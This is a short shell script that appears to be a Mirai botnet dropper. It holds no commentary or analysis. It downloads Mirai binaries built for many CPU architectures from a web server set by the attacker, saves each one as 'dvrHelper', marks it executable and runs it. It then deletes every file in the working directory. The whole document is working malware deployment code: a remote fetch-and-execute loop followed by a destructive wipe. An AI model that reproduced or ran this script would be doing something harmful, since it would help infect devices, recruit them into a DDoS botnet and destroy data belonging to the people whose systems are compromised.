#!/bin/sh

# Edit
WEBSERVER="IP:80"
# Stop editing now


BINARIES="mirai.arm5n mirai.m68k mirai.mpsl miraint.arm5n miraint.m68k miraint.mpsl miraint.sh4 miraint.x86 mirai.sh4 mirai.x86 mirai.arm mirai.arm7 mirai.mips miraint.arm miraint.arm7 miraint.mips miraint.ppc miraint.spc mirai.ppc mirai.spc"

for Binary in $BINARIES; do
    wget http://$WEBSERVER/$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done

rm -f *
